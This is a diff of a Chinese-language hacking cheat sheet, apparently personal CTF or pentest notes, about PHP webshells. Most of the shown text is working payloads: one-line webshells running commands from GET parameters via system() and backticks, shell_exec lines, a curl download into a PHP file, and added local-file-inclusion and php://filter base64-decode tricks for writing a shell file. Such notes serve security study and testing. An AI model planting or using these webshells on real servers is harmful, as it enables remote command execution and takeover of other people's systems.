@@ -23,7 +23,17 @@
 <?php system(ls); ?>
 <?php system($_GET['cmd']); ?>
 <?php system($_GET[1]); ?>
+
 <?=`$_GET[1]`;                   // <?= is used to shorten the <?php echo `blah`;
+// ``就像exec不會直接顯示結果，需要echo
+echo `$_GET[1]`;&1=ls
+
+// local file inclusion
+include$_GET[1];             // 中間空格可以省略
+// 思路：寫入base64編碼過的shell檔，再進行解碼  <環境www>
+$_GET[1](file,chracter,8);&1=file_put_contents .....
+include$_GET[0];&0=php://filter/read=convert.base64-decode/resource=file
+
 <?php shell_exec('echo 1>1');        // 1=echo 1>1
 <?php shell_exec('>1');            // 1=>1
 
@@ -31,11 +41,11 @@
 <?php shell_exec('curl -o 1.php url');    // 預設下載index.html
 ```
 長度限制思路：  
-* 用檔名拼湊成命令,再一次ls進一個shell script  
-  [detail](https://shinmao.github.io/2018/02/20/A-tiny-shell/)
+* 用檔名拼湊成命令,再一次ls進一個shell script[detail](https://shinmao.github.io/2018/02/20/A-tiny-shell/)
 * 待續...
 
-[system v.s. exec v.s. shell_exec](https://blog.longwin.com.tw/2013/06/php-system-exec-shell_exec-diff-2013/)  
+[system v.s. exec v.s. shell_exec](https://blog.longwin.com.tw/2013/06/php-system-exec-shell_exec-diff-2013/)  
+**基本上除了system都不會直接show在頁面上，exec()和shell_exec()我們都會搭個echo**
 
 ### SQL inj to webshell
 MYSQL:  
